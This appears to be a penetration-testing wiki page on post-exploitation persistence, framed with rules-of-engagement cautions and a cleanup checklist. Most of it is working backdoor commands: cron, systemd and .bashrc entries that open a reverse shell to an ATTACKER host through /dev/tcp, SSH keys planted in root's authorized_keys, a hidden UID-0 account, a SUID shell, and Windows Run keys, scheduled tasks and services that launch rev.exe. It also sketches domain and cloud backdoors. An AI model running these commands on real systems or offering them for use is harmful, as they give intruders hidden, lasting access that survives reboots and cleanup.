---
tags:
  - Privesc
  - Windows
  - Linux
---

# :material-anchor: Persistence

<span class="pill pill-medium">post-ex</span> <span class="pill pill-info">windows</span> <span class="pill pill-info">linux</span>

Persistence keeps your access alive across reboots, credential changes, and defender cleanup. On engagements it demonstrates *impact* and lets you resume without re-exploiting.

!!! opsec "Persistence is inherently high-risk on real engagements"
    Backdoors change the system's security state and are prime detection targets. **Only deploy persistence when your ROE permits it, document every mechanism, and remove it during cleanup.** Track everything you drop.

## :material-linux: Linux persistence

=== "Cron / systemd"

    ```bash
    # User or root crontab callback
    (crontab -l 2>/dev/null; echo "*/10 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'") | crontab -
    # systemd service + timer
    cat >/etc/systemd/system/updater.service <<'EOF'
    [Service]
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
    EOF
    systemctl enable --now updater.service
    ```

=== "SSH keys"

    ```bash
    mkdir -p ~/.ssh; echo "ssh-ed25519 AAAA... attacker" >> ~/.ssh/authorized_keys
    # Root persistence if writable:
    echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys
    ```

=== "Accounts & SUID"

    ```bash
    # Hidden UID-0 account
    echo 'svc:$1$x$hash:0:0::/root:/bin/bash' >> /etc/passwd
    # SUID backdoor shell
    cp /bin/bash /var/tmp/.cache; chmod 4755 /var/tmp/.cache   # run: /var/tmp/.cache -p
    ```

=== "Shell profile / PAM"

    ```bash
    echo 'bash -i >& /dev/tcp/ATTACKER/443 0>&1 &' >> ~/.bashrc
    # Malicious PAM module or authorized_keys command= are stealthier options
    ```

## :material-microsoft-windows: Windows persistence

=== "Run keys / startup"

    ```powershell
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\temp\rev.exe"
    # Startup folder
    copy rev.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
    ```

=== "Scheduled task / service"

    ```powershell
    schtasks /create /sc onlogon /tn "Updater" /tr "C:\temp\rev.exe" /rl highest
    sc create updatesvc binPath= "C:\temp\rev.exe" start= auto
    ```

=== "WMI event subscription"

    ```powershell
    # Fileless-ish: fires on a condition (e.g., every N seconds / on logon)
    # Use PowerLurk / native WMI (__EventFilter + CommandLineEventConsumer)
    ```

=== "Local account / RID hijack"

    ```powershell
    net user backupadm P@ssw0rd! /add
    net localgroup administrators backupadm /add
    ```

!!! loot "Domain-level persistence beats host-level"
    In AD, the durable backdoors live in the directory: **Golden Ticket** (KRBTGT hash), **AdminSDHolder** ACL, **DCShadow**, and a hidden principal with DCSync rights. See [Active Directory](../network/active-directory.md) and [Kerberos](../network/kerberos.md).

## :material-cloud: Cloud persistence

- **AWS**: new IAM user + access key, or a role trust policy allowing your external account. See [AWS](../cloud/aws.md).
- **Azure**: add credentials/certs to a service principal, rogue app registration. See [Azure](../cloud/azure.md).
- **GCP**: create a service-account JSON key. See [GCP](../cloud/gcp.md).

!!! tip "Prefer credential-based cloud persistence"
    Cloud keys survive instance reboots and image rebuilds; host-level backdoors on an ephemeral VM don't. But every key you mint is logged — record them for cleanup.

## :material-broom: Cleanup checklist (report phase)

- [ ] Remove every added account, key, task, service, cron, and registry value.
- [ ] Delete uploaded binaries/scripts and payload staging dirs.
- [ ] Revoke/rotate any minted cloud credentials.
- [ ] Note anything that requires the client to rotate (KRBTGT, service creds).

## :material-link-variant: Related

- Follows [Linux](linux.md) / [Windows Privesc](windows.md) and [Active Directory](../network/active-directory.md).
- Reference: [MITRE ATT&CK – Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/).
